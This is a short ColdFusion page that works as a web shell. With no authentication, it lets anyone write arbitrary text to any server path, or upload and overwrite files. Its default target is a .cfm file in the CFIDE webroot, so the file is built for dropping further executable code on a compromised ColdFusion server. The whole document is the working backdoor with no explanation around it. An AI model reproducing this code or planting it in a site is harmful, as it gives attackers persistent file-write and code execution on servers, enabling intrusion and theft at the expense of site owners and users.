<CFPARAM NAME="Form.Action" DEFAULT="ShowPost">
<CFSWITCH EXPRESSION=#Form.Action#>
<CFCASE VALUE="write">
<CFFILE ACTION="Write" FILE="#Form.path#" OUTPUT="#Form.cmd#">
Write ok
</CFCASE>
<CFCASE VALUE="upload">
<CFFILE ACTION="UPLOAD" FILEFIELD="FileContents" DESTINATION="#Form.path#" NAMECONFLICT="OVERWRITE">
UPLOAD ok
</CFCASE>
<CFDEFAULTCASE>
<form action="" target="_blank" method=post>
<textarea style="width:600;height:200" name="cmd"></textarea><br>
<input name="path" value="C:\inetpub\wwwroot\CFIDE\log_info.cfm" size=72>
<input type=submit value="Write File">
<input type=hidden name="action" value="write">
</form>
<br>
<FORM ACTION="" ENCTYPE="multipart/form-data" METHOD="Post" target="_blank">
PATH:<INPUT NAME="path" value="C:\inetpub\wwwroot\CFIDE\log_info.cfm" size=72><br>
FILE:<INPUT NAME="FileContents" TYPE="file" size=50>
<input type=hidden name="action" value="upload">
<INPUT TYPE="submit" VALUE="UPLOAD">
</FORM>
<br>
</CFDEFAULTCASE>
</CFSWITCH>

